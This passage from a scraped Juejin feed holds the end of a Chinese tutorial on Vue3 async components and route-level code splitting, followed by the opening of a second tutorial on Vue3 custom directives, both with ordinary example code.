// 使用 async setup（Suspense 会自动等待）
const setupData = async () =&gt; {
  console.log('开始加载仪表板数据...')
  
  // 并行加载所有数据
  const [user, statistics, recentActivities] = await Promise.all([
    fetchUserData(),
    fetchStats(),
    fetchActivities()
  ])
  
  userData.value = user
  stats.value = statistics
  activities.value = recentActivities
  
  console.log('仪表板数据加载完成')
}

// 执行异步设置
await setupData()

onMounted(() =&gt; {
  console.log('UserDashboard 组件已挂载，用户ID:', props.userId)
})
&lt;/script&gt;
</code></pre>
<hr/>
<h3 data-id="heading-14"><strong>五、 路由级别的异步加载</strong></h3>
<p>在实际项目中，我们经常需要在路由级别进行代码分割。</p>
<h4 data-id="heading-15"><strong>5.1 Vue Router 4 中的异步路由</strong></h4>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-comment">// router/index.js</span>
<span class="hljs-keyword">import</span> { createRouter, createWebHistory } <span class="hljs-keyword">from</span> <span class="hljs-string">'vue-router'</span>
<span class="hljs-keyword">import</span> <span class="hljs-title class_">Home</span> <span class="hljs-keyword">from</span> <span class="hljs-string">'../views/Home.vue'</span>

<span class="hljs-keyword">const</span> routes = [
  {
    <span class="hljs-attr">path</span>: <span class="hljs-string">'/'</span>,
    <span class="hljs-attr">name</span>: <span class="hljs-string">'Home'</span>,
    <span class="hljs-attr">component</span>: <span class="hljs-title class_">Home</span>
  },
  {
    <span class="hljs-attr">path</span>: <span class="hljs-string">'/about'</span>,
    <span class="hljs-attr">name</span>: <span class="hljs-string">'About'</span>,
    <span class="hljs-comment">// 路由级别代码分割</span>
    <span class="hljs-attr">component</span>: <span class="hljs-function">() =&gt;</span> <span class="hljs-keyword">import</span>(<span class="hljs-string">'../views/About.vue'</span>)
  },
  {
    <span class="hljs-attr">path</span>: <span class="hljs-string">'/user/:id'</span>,
    <span class="hljs-attr">name</span>: <span class="hljs-string">'UserProfile'</span>,
    <span class="hljs-comment">// 带有加载状态的异步路由</span>
    <span class="hljs-attr">component</span>: <span class="hljs-title function_">defineAsyncComponent</span>({
      <span class="hljs-attr">loader</span>: <span class="hljs-function">() =&gt;</span> <span class="hljs-keyword">import</span>(<span class="hljs-string">'../views/UserProfile.vue'</span>),
      <span class="hljs-attr">loadingComponent</span>: <span class="hljs-title class_">LoadingSpinner</span>,
      <span class="hljs-attr">errorComponent</span>: <span class="hljs-title class_">ErrorDisplay</span>,
      <span class="hljs-attr">delay</span>: <span class="hljs-number">200</span>,
      <span class="hljs-attr">timeout</span>: <span class="hljs-number">3000</span>
    })
  },
  {
    <span class="hljs-attr">path</span>: <span class="hljs-string">'/admin'</span>,
    <span class="hljs-attr">name</span>: <span class="hljs-string">'Admin'</span>,
    <span class="hljs-comment">// 条件性异步加载（基于用户权限）</span>
    <span class="hljs-attr">component</span>: <span class="hljs-function">() =&gt;</span> {
      <span class="hljs-keyword">const</span> user = store.<span class="hljs-property">getters</span>.<span class="hljs-property">currentUser</span>
      <span class="hljs-keyword">if</span> (user?.<span class="hljs-property">isAdmin</span>) {
        <span class="hljs-keyword">return</span> <span class="hljs-keyword">import</span>(<span class="hljs-string">'../views/AdminDashboard.vue'</span>)
      } <span class="hljs-keyword">else</span> {
        <span class="hljs-keyword">return</span> <span class="hljs-keyword">import</span>(<span class="hljs-string">'../views/AccessDenied.vue'</span>)
      }
    }
  }
]

<span class="hljs-keyword">const</span> router = <span class="hljs-title function_">createRouter</span>({
  <span class="hljs-attr">history</span>: <span class="hljs-title function_">createWebHistory</span>(),
  routes
})

<span class="hljs-keyword">export</span> <span class="hljs-keyword">default</span> router
</code></pre>
<h4 data-id="heading-16"><strong>5.2 路由组件示例</strong></h4>
<p><strong>views/UserProfile.vue</strong>：</p>
<pre><code class="hljs language-vue" lang="vue">&lt;template&gt;
  &lt;div class="user-profile-page"&gt;
    &lt;div class="header"&gt;
      &lt;h1&gt;用户详情&lt;/h1&gt;
      &lt;p&gt;用户ID: {{ $route.params.id }}&lt;/p&gt;
    &lt;/div&gt;
    
    &lt;Suspense&gt;
      &lt;template #default&gt;
        &lt;UserDetailContent :user-id="$route.params.id" /&gt;
      &lt;/template&gt;
      &lt;template #fallback&gt;
        &lt;div class="page-loading"&gt;
          &lt;h3&gt;加载用户信息...&lt;/h3&gt;
        &lt;/div&gt;
      &lt;/template&gt;
    &lt;/Suspense&gt;
  &lt;/div&gt;
&lt;/template&gt;

&lt;script setup&gt;
import { defineAsyncComponent } from 'vue'

// 异步加载用户详情内容
const UserDetailContent = defineAsyncComponent({
  loader: () =&gt; import('../components/UserDetailContent.vue'),
  loadingComponent: {
    template: '&lt;div&gt;加载用户详情...&lt;/div&gt;'
  }
})
&lt;/script&gt;
</code></pre>
<hr/>
<h3 data-id="heading-17"><strong>六、 高级模式与最佳实践</strong></h3>
<h4 data-id="heading-18"><strong>6.1 预加载策略</strong></h4>
<pre><code class="hljs language-vue" lang="vue">&lt;template&gt;
  &lt;div class="app"&gt;
    &lt;nav&gt;
      &lt;router-link to="/"&gt;首页&lt;/router-link&gt;
      &lt;router-link to="/about" @mouseenter="preloadAbout"&gt;关于&lt;/router-link&gt;
      &lt;router-link to="/contact" @touchstart="preloadContact"&gt;联系&lt;/router-link&gt;
    &lt;/nav&gt;
    &lt;router-view /&gt;
  &lt;/div&gt;
&lt;/template&gt;

&lt;script setup&gt;
import { defineAsyncComponent } from 'vue'

// 预加载函数
const preloadAbout = () =&gt; {
  // 预加载关于页面
  import('./views/About.vue').then(module =&gt; {
    console.log('关于页面预加载完成')
  })
}

const preloadContact = () =&gt; {
  // 预加载联系页面（移动端 touchstart 事件）
  import('./views/Contact.vue')
}

// 关键组件预加载（在空闲时间）
const preloadCriticalComponents = () =&gt; {
  if ('requestIdleCallback' in window) {
    requestIdleCallback(() =&gt; {
      import('./components/CriticalComponent.vue')
    })
  }
}

// 应用启动后预加载关键组件
onMounted(() =&gt; {
  preloadCriticalComponents()
})
&lt;/script&gt;
</code></pre>
<h4 data-id="heading-19"><strong>6.2 错误边界与重试机制</strong></h4>
<pre><code class="hljs language-vue" lang="vue">&lt;template&gt;
  &lt;div&gt;
    &lt;ErrorBoundary&gt;
      &lt;template #default&gt;
        &lt;UnstableAsyncComponent /&gt;
      &lt;/template&gt;
      &lt;template #fallback="{ error, reset }"&gt;
        &lt;div class="error-boundary"&gt;
          &lt;h3&gt;组件加载失败&lt;/h3&gt;
          &lt;p&gt;{{ error.message }}&lt;/p&gt;
          &lt;button @click="reset"&gt;重试&lt;/button&gt;
        &lt;/div&gt;
      &lt;/template&gt;
    &lt;/ErrorBoundary&gt;
  &lt;/div&gt;
&lt;/template&gt;

&lt;script setup&gt;
import { defineAsyncComponent, ref, onErrorCaptured } from 'vue'

// 错误边界组件
const ErrorBoundary = {
  setup(props, { slots }) {
    const error = ref(null)
    
    const reset = () =&gt; {
      error.value = null
    }
    
    onErrorCaptured((err) =&gt; {
      error.value = err
      return false // 阻止错误继续向上传播
    })
    
    return () =&gt; {
      if (error.value) {
        return slots.fallback?.({ error: error.value, reset })
      }
      return slots.default?.()
    }
  }
}

// 不稳定的异步组件（模拟可能失败）
const UnstableAsyncComponent = defineAsyncComponent({
  loader: async () =&gt; {
    // 模拟随机失败
    if (Math.random() &gt; 0.5) {
      throw new Error('随机加载失败')
    }
    await new Promise(resolve =&gt; setTimeout(resolve, 1000))
    return import('./components/UnstableComponent.vue')
  },
  onError: (error, retry, fail, attempts) =&gt; {
    if (attempts &lt;= 3) {
      // 重试最多3次
      console.log(`重试加载，尝试次数: ${attempts}`)
      retry()
    } else {
      fail()
    }
  }
})
&lt;/script&gt;
</code></pre>
<hr/>
<h3 data-id="heading-20"><strong>七、 性能优化与调试技巧</strong></h3>
<h4 data-id="heading-21"><strong>7.1 Webpack Bundle Analyzer</strong></h4>
<p>分析打包结果，优化代码分割：</p>
<pre><code class="hljs language-bash" lang="bash">npm install --save-dev webpack-bundle-analyzer
</code></pre>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-comment">// vue.config.js</span>
<span class="hljs-keyword">const</span> { defineConfig } = <span class="hljs-built_in">require</span>(<span class="hljs-string">'@vue/cli-service'</span>)
<span class="hljs-keyword">const</span> <span class="hljs-title class_">BundleAnalyzerPlugin</span> = <span class="hljs-built_in">require</span>(<span class="hljs-string">'webpack-bundle-analyzer'</span>).<span class="hljs-property">BundleAnalyzerPlugin</span>

<span class="hljs-variable language_">module</span>.<span class="hljs-property">exports</span> = <span class="hljs-title function_">defineConfig</span>({
  <span class="hljs-attr">transpileDependencies</span>: <span class="hljs-literal">true</span>,
  <span class="hljs-attr">configureWebpack</span>: {
    <span class="hljs-attr">plugins</span>: [
      <span class="hljs-keyword">new</span> <span class="hljs-title class_">BundleAnalyzerPlugin</span>({
        <span class="hljs-attr">analyzerMode</span>: process.<span class="hljs-property">env</span>.<span class="hljs-property">NODE_ENV</span> === <span class="hljs-string">'production'</span> ? <span class="hljs-string">'static'</span> : <span class="hljs-string">'disabled'</span>,
        <span class="hljs-attr">openAnalyzer</span>: <span class="hljs-literal">false</span>
      })
    ],
    <span class="hljs-attr">optimization</span>: {
      <span class="hljs-attr">splitChunks</span>: {
        <span class="hljs-attr">chunks</span>: <span class="hljs-string">'all'</span>,
        <span class="hljs-attr">cacheGroups</span>: {
          <span class="hljs-attr">vendor</span>: {
            <span class="hljs-attr">test</span>: <span class="hljs-regexp">/[\\/]node_modules[\\/]/</span>,
            <span class="hljs-attr">name</span>: <span class="hljs-string">'vendors'</span>,
            <span class="hljs-attr">chunks</span>: <span class="hljs-string">'all'</span>
          }
        }
      }
    }
  }
})
</code></pre>
<h4 data-id="heading-22"><strong>7.2 性能监控</strong></h4>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-comment">// utils/performance.js</span>
<span class="hljs-keyword">export</span> <span class="hljs-keyword">const</span> <span class="hljs-title function_">trackComponentLoad</span> = (<span class="hljs-params">componentName, startTime</span>) =&gt; {
  <span class="hljs-keyword">const</span> loadTime = performance.<span class="hljs-title function_">now</span>() - startTime
  <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">`🚀 <span class="hljs-subst">${componentName}</span> 加载耗时: <span class="hljs-subst">${loadTime.toFixed(<span class="hljs-number">2</span>)}</span>ms`</span>)
  
  <span class="hljs-comment">// 发送到监控系统</span>
  <span class="hljs-keyword">if</span> (loadTime &gt; <span class="hljs-number">2000</span>) {
    <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">warn</span>(<span class="hljs-string">`⚠️ <span class="hljs-subst">${componentName}</span> 加载较慢`</span>)
  }
}

<span class="hljs-comment">// 在异步组件中使用</span>
<span class="hljs-keyword">const</span> startTime = performance.<span class="hljs-title function_">now</span>()
<span class="hljs-keyword">const</span> <span class="hljs-title class_">AsyncComponent</span> = <span class="hljs-title function_">defineAsyncComponent</span>({
  <span class="hljs-attr">loader</span>: <span class="hljs-keyword">async</span> () =&gt; {
    <span class="hljs-keyword">const</span> component = <span class="hljs-keyword">await</span> <span class="hljs-keyword">import</span>(<span class="hljs-string">'./components/HeavyComponent.vue'</span>)
    <span class="hljs-title function_">trackComponentLoad</span>(<span class="hljs-string">'HeavyComponent'</span>, startTime)
    <span class="hljs-keyword">return</span> component
  }
})
</code></pre>
<hr/>
<h3 data-id="heading-23"><strong>八、 总结</strong></h3>
<p>Vue3 的异步组件系统提供了强大而灵活的工具来优化应用性能：</p>
<h4 data-id="heading-24"><strong>核心优势</strong></h4>
<ol>
<li><strong>减小初始包体积</strong>：显著提升首屏加载速度</li>
<li><strong>按需加载</strong>：只在需要时加载代码，节省带宽</li>
<li><strong>更好的缓存</strong>：独立 chunk 可独立缓存</li>
<li><strong>提升用户体验</strong>：合理的加载状态和错误处理</li>
</ol>
<h4 data-id="heading-25"><strong>技术选择指南</strong></h4>



































<table><thead><tr><th>场景</th><th>推荐方案</th><th>优点</th></tr></thead><tbody><tr><td>简单异步加载</td><td><code>defineAsyncComponent(() =&gt; import())</code></td><td>简洁直观</td></tr><tr><td>需要加载状态</td><td><code>defineAsyncComponent</code> 完整配置</td><td>完整的状态管理</td></tr><tr><td>现代应用</td><td><code>&lt;Suspense&gt;</code> + 异步组件</td><td>声明式、更优雅</td></tr><tr><td>路由级别</td><td>Vue Router 动态导入</td><td>天然的路由分割</td></tr><tr><td>复杂异步逻辑</td><td>组合式函数 + 异步组件</td><td>最大灵活性</td></tr></tbody></table>
<h4 data-id="heading-26"><strong>最佳实践提醒</strong></h4>
<ul>
<li>合理设置 <code>delay</code> 避免加载闪烁</li>
<li>始终处理加载错误情况</li>
<li>使用预加载提升关键路径性能</li>
<li>监控组件加载性能</li>
<li>合理划分代码分割点</li>
</ul>
<p>通过合理运用 Vue3 的异步组件特性，你可以构建出既快速又用户体验良好的现代 Web 应用。</p>
<hr/>
<p><strong>希望这篇深度解析能帮助你全面掌握 Vue3 的异步组件加载！如有任何问题，欢迎在评论区讨论。</strong></p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[Vue3 自定义指令深度解析：从基础到高级应用的完整指南]]></title>    <link>https://juejin.cn/post/7575655132748005412</link>    <guid>https://juejin.cn/post/7575655132748005412</guid>    <pubDate>2025-11-23T03:31:20.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7575655132748005412" data-draft-id="7575320672572244010" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="Vue3 自定义指令深度解析：从基础到高级应用的完整指南"/> <meta itemprop="keywords" content="Vue.js,前端"/> <meta itemprop="datePublished" content="2025-11-23T03:31:20.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="北辰alk"/> <meta itemprop="url" content="https://juejin.cn/user/1772855673241352"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="掘金"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            Vue3 自定义指令深度解析：从基础到高级应用的完整指南
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/1772855673241352/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    北辰alk
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2025-11-23T03:31:20.000Z" title="Sun Nov 23 2025 03:31:20 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2025-11-23
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    阅读7分钟
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><h2 data-id="heading-0"><strong>摘要</strong></h2>
<p>自定义指令是 Vue.js 中一个强大而灵活的特性，它允许开发者直接对 DOM 元素进行底层操作。Vue3 在保留自定义指令核心概念的同时，对其 API 进行了调整和优化，使其更符合组合式 API 的设计理念。本文将深入探讨 Vue3 中自定义指令的定义方式、生命周期钩子、使用场景和最佳实践，通过丰富的代码示例和清晰的流程图，帮助你彻底掌握这一重要特性。</p>
<hr/>
<h2 data-id="heading-1"><strong>一、 什么是自定义指令？为什么需要它？</strong></h2>
<h3 data-id="heading-2"><strong>1.1 自定义指令的概念</strong></h3>
<p>在 Vue.js 中，指令是带有 <code>v-</code> 前缀的特殊属性。除了 Vue 内置的指令（如 <code>v-model</code>、<code>v-show</code>、<code>v-if</code> 等），Vue 还允许我们注册自定义指令，用于对普通 DOM 元素进行底层操作。</p>
<h3 data-id="heading-3"><strong>1.2 使用场景</strong></h3>
<p>自定义指令在以下场景中特别有用：</p>
<ol>
<li><strong>DOM 操作</strong>：焦点管理、文本选择、元素拖拽</li>
<li><strong>输入限制</strong>：格式化输入内容、阻止无效字符</li>
<li><strong>权限控制</strong>：根据权限显示/隐藏元素</li>
<li><strong>集成第三方库</strong>：与 jQuery 插件、图表库等集成</li>
<li><strong>性能优化</strong>：图片懒加载、无限滚动</li>
<li><strong>用户体验</strong>：点击外部关闭、滚动加载更多</li>
</ol>
<h3 data-id="heading-4"><strong>1.3 Vue2 与 Vue3 自定义指令的区别</strong></h3>






























<table><thead><tr><th>特性</th><th>Vue2</th><th>Vue3</th></tr></thead><tbody><tr><td><strong>生命周期钩子</strong></td><td><code>bind</code>, <code>inserted</code>, <code>update</code>, <code>componentUpdated</code>, <code>unbind</code></td><td><code>created</code>, <code>beforeMount</code>, <code>mounted</code>, <code>beforeUpdate</code>, <code>updated</code>, <code>beforeUnmount</code>, <code>unmounted</code></td></tr><tr><td><strong>参数传递</strong></td><td><code>el</code>, <code>binding</code>, <code>vnode</code>, <code>oldVnode</code></td><td><code>el</code>, <code>binding</code>, <code>vnode</code>, <code>prevVnode</code></td></tr><tr><td><strong>注册方式</strong></td><td>全局 <code>Vue.directive()</code>，局部 <code>directives</code> 选项</td><td>全局 <code>app.directive()</code>，局部 <code>directives</code> 选项</td></tr><tr><td><strong>与组合式API集成</strong></td><td>有限</td><td>更好，可在 setup 中使用</td></tr></tbody></table>
<hr/>
<h2 data-id="heading-5"><strong>二、 自定义指令的基本结构</strong></h2>
<h3 data-id="heading-6"><strong>2.1 指令的生命周期钩子</strong></h3>
<p>Vue3 中的自定义指令包含一系列生命周期钩子，这些钩子在指令的不同阶段被调用：</p>
<p><strong>流程图：自定义指令生命周期</strong></p>
<pre><code class="hljs language-mermaid" lang="mermaid">flowchart TD
    A[指令创建] --&gt; B[created&lt;br&gt;元素属性/事件监听器应用之前]
    B --&gt; C[beforeMount&lt;br&gt;元素挂载到DOM之前]
    C --&gt; D[mounted&lt;br&gt;元素挂载到DOM之后]
    D --&gt; E{指令绑定值变化?}
    E -- 是 --&gt; F[beforeUpdate&lt;br&gt;元素更新之前]
    F --&gt; G[updated&lt;br&gt;元素更新之后]
    E -- 否 --&gt; H[元素卸载]
    H --&gt; I[beforeUnmount&lt;br&gt;元素卸载之前]
    I --&gt; J[unmounted&lt;br&gt;元素卸载之后]
</code></pre>
<h3 data-id="heading-7"><strong>2.2 钩子函数参数</strong></h3>
<p>每个生命周期钩子函数都会接收以下参数：</p>
<ul>
<li><strong><code>el</code></strong>：指令绑定的元素，可以直接操作 DOM</li>
<li><strong><code>binding</code></strong>：一个对象，包含指令的相关信息</li>
<li><strong><code>vnode</code></strong>：Vue 编译生成的虚拟节点</li>
<li><strong><code>prevVnode</code></strong>：上一个虚拟节点（仅在 <code>beforeUpdate</code> 和 <code>updated</code> 中可用）</li>
</ul>
<p><strong>binding 对象结构：</strong></p>
<pre><code class="hljs language-javascript" lang="javascript">{
  <span class="hljs-attr">value</span>:        any,        <span class="hljs-comment">// 指令的绑定值，如 v-my-directive="value"</span>
  <span class="hljs-attr">oldValue</span>:     any,        <span class="hljs-comment">// 指令绑定的前一个值</span>
  <span class="hljs-attr">arg</span>:          string,     <span class="hljs-comment">// 指令的参数，如 v-my-directive:arg</span>
  <span class="hljs-attr">modifiers</span>:    object,     <span class="hljs-comment">// 指令的修饰符对象，如 v-my-directive.modifier</span>
  <span class="hljs-attr">instance</span>:     <span class="hljs-title class_">Component</span>,  <span class="hljs-comment">// 使用指令的组件实例</span>
  <span class="hljs-attr">dir</span>:          object      <span class="hljs-comment">// 指令的定义对象</span>
}
</code></pre>
<hr/>
<h2 data-id="heading-8"><strong>三、 定义自定义指令的多种方式</strong></h2>
<h3 data-id="heading-9"><strong>3.1 全局自定义指令</strong></h3>
<p>全局指令在整个 Vue 应用中都可用。</p>
<h4 data-id="heading-10"><strong>方式一：使用 <code>app.directive()</code></strong></h4>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-comment">// main.js</span>
<span class="hljs-keyword">import</span> { createApp } <span class="hljs-keyword">from</span> <span class="hljs-string">'vue'</span>
<span class="hljs-keyword">import</span> <span class="hljs-title class_">App</span> <span class="hljs-keyword">from</span> <span class="hljs-string">'./App.vue'</span>

<span class="hljs-keyword">const</span> app = <span class="hljs-title function_">createApp</span>(<span class="hljs-title class_">App</span>)

<span class="hljs-comment">// 定义全局焦点指令</span>
app.<span class="hljs-title function_">directive</span>(<span class="hljs-string">'focus'</span>, {
  <span class="hljs-title function_">mounted</span>(<span class="hljs-params">el</span>) {
    el.<span class="hljs-title function_">focus</span>()
    <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">'元素获得焦点'</span>)
  }
})

<span class="hljs-comment">// 定义全局颜色指令（带参数和值）</span>
app.<span class="hljs-title function_">directive</span>(<span class="hljs-string">'color'</span>, {
  <span class="hljs-title function_">beforeMount</span>(<span class="hljs-params">el, binding</span>) {
    el.<span class="hljs-property">style</span>.<span class="hljs-property">color</span> = binding.<span class="hljs-property">value</span>
  },
  <span class="hljs-title function_">updated</span>(<span class="hljs-params">el, binding</span>) {
    el.<span class="hljs-property">style</span>.<span class="hljs-property">color</span> = binding.<span class="hljs-property">value</span>
  }
})

app.<span class="hljs-title function_">mount</span>(<span class="hljs-string">'#app'</span>)
</code></pre>
<h4 data-id="heading-11"><strong>方式二：使用插件形式</strong></h4>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-comment">// directives/index.js</span>
<span class="hljs-keyword">export</span> <span class="hljs-keyword">const</span> focusDirective = {
  <span class="hljs-title function_">mounted</span>(<span class="hljs-params">el</span>) {
    el.<span class="hljs-title function_">focus</span>()
  }
}

<span class="hljs-keyword">export</span> <span class="hljs-keyword">const</span> colorDirective = {
  <span class="hljs-title function_">beforeMount</span>(<span class="hljs-params">el, binding</span>) {
    el.<span class="hljs-property">style</span>.<span class="hljs-property">color</span> = binding.<span class="hljs-property">value</span>
  },
  <span class="hljs-title function_">updated</span>(<span class="hljs-params">el, binding</span>) {
    el.<span class="hljs-property">style</span>.<span class="hljs-property">color</span> = binding.<span class="hljs-property">value</span>
  }
}

<span class="hljs-comment">// 注册所有指令</span>
<span class="hljs-keyword">export</span> <span class="hljs-keyword">function</span> <span class="hljs-title function_">registerDirectives</span>(<span class="hljs-params">app</span>) {
  app.<span class="hljs-title function_">directive</span>(<span class="hljs-string">'focus'</span>, focusDirective)
  app.<span class="hljs-title function_">directive</span>(<span class="hljs-string">'color'</span>, colorDirective)
}

<span class="hljs-comment">// main.js</span>
<span class="hljs-keyword">import</span> { createApp } <span class="hljs-keyword">from</span> <span class="hljs-string">'vue'</span>
<span class="hljs-keyword">import</span> <span class="hljs-title class_">App</span> <span class="hljs-keyword">from</span> <span class="hljs-string">'./App.vue'</span>
<span class="hljs-keyword">import</span> { registerDirectives } <span class="hljs-keyword">from</span> <span class="hljs-string">'./directives'</span>

<span class="hljs-keyword">const</span> app = <span class="hljs-title function_">createApp</span>(<span class="hljs-title class_">App</span>)
<span class="hljs-title function_">registerDirectives</span>(app)
app.<span class="hljs-title function_">mount</span>(<span class="hljs-string">'#app'</span>)
</code></pre>
<h3 data-id="heading-12"><strong>3.2 局部自定义指令</strong></h3>
<p>局部指令只在特定组件中可用。</p>
<h4 data-id="heading-13"><strong>选项式 API</strong></h4>
<pre><code class="hljs language-vue" lang="vue">&lt;template&gt;
  &lt;div&gt;
    &lt;input v-focus-local placeholder="局部焦点指令" /&gt;
    &lt;p v-color-local="textColor"&gt;这个文本颜色会变化&lt;/p&gt;
    &lt;button @click="changeColor"&gt;改变颜色&lt;/button&gt;
  &lt;/div&gt;
&lt;/template&gt;

&lt;script&gt;
export default {
  data() {
    return {
      textColor: 'red'
    }
  },
  methods: {
    changeColor() {
      this.textColor = this.textColor === 'red' ? 'blue' : 'red'
    }
  },
  directives: {
    // 局部焦点指令
    'focus-local': {
      mounted(el) {
        el.focus()
      }
    },
    // 局部颜色指令
    'color-local': {
      beforeMount(el, binding) {
        el.style.color = binding.value
      },
      updated(el, binding) {
        el.style.color = binding.value
      }
    }
  }
}
&lt;/script&gt;
</code></pre>
<h4 data-id="heading-14"><strong>组合式 API</strong></h4>
<pre><code class="hljs language-vue" lang="vue">&lt;template&gt;
  &lt;div&gt;
    &lt;input v-focus-local placeholder="局部焦点指令" /&gt;
    &lt;p v-color-local="textColor"&gt;这个文本颜色会变化&lt;/p&gt;
